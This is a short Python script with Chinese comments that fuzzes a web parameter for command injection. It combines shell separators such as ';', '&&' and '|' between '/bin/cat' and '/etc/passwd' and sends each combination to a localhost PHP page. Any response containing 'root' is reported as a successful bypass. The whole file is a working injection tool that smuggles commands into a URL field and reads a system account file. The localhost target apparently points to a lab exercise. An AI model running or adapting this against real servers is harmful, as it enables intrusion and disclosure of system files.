#! -*- encoding:utf-8 -*-
#脚本从网上下载修改的

import requests
import sys

fuzz_zs = [';','@','???',';','@','^','()','&&','&','-','|','-','||','$','+','$u']
#fuzz_cc = ['||']
#fuzz_bb = ['&&']



#fuzz = fuzz_zs+fuzz_cc+fuzz_bb
fuzz  = fuzz_zs

#做一个列表（绕过的特殊字符，内联注释。）
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"}
url_start = "http://localhost:8888/1.php?name="


len = len(fuzz)**5
num = 0

for b in fuzz:
    for c in fuzz:
        for d in fuzz:



                    num += 1
                    exp ="/bin/cat"+b+c+d+"/etc/passwd"
                                        #组合成我们可以绕过的语句
                    url = url_start + exp
                    sys.stdout.write(' '*30 + '\r')
                    sys.stdout.flush()
                    print("GO GO GO:"+url)
                    sys.stdout.write("完成进度:%s/%s"%(num,len))
                    sys.stdout.flush()
                    res = requests.get(url = url , headers = headers)
                    if "root" in res.text: 
                                        #判断页面是否存在<td>标签 ，如果存在则成功绕过
                        print("成功 bypass:"+url)    

                                      #如果成功反回：成功bypass: +url
